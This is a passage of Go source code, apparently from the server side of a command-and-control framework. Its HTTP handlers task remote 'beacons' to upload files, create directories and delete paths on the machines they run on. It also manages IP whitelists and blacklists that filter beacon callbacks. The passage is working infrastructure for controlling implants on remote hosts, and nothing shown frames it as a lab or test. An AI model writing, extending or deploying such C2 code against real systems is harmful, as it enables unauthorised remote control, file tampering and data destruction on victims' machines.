	}

	// Return base64 data as JSON (frontend will decode and download)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: data})
}

// handleRemoteFMUpload uploads a file to a remote beacon
func handleRemoteFMUpload(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
		Data     string `json:"data"` // base64 encoded
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" || req.Data == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id, path, and data required"})
		return
	}

	command := "__FILEUPLOAD__ " + req.Path + " " + req.Data
	result, err := sendTaskAndWait(req.ClientID, command, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILE_UPLOADED", Data: data})
}

// handleRemoteFMMkdir creates a directory on a remote beacon
func handleRemoteFMMkdir(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	result, err := sendTaskAndWait(req.ClientID, "__MKDIR__ "+req.Path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DIRECTORY_CREATED", Data: data})
}

// handleRemoteFMDelete deletes a file or directory on a remote beacon
func handleRemoteFMDelete(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	result, err := sendTaskAndWait(req.ClientID, "__DELETE__ "+req.Path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED", Data: data})
}

// ==================== Callback Filter API ====================

func handleGetFilters(c *gin.Context) {
	filterMutex.RLock()
	defer filterMutex.RUnlock()

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"ip_whitelist": ipWhitelist,
			"ip_blacklist": ipBlacklist,
		},
	})
}

func handleUpdateFilters(c *gin.Context) {
	var req struct {
		IPWhitelist []string `json:"ip_whitelist"`
		IPBlacklist []string `json:"ip_blacklist"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	filterMutex.Lock()
	if req.IPWhitelist != nil {
		ipWhitelist = req.IPWhitelist
	}
	if req.IPBlacklist != nil {
		ipBlacklist = req.IPBlacklist
	}
	filterMutex.Unlock()

	addLog("FILTER", fmt.Sprintf("FILTERS_UPDATED: whitelist=%d blacklist=%d",
		len(ipWhitelist), len(ipBlacklist)))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILTERS_UPDATED"})
}
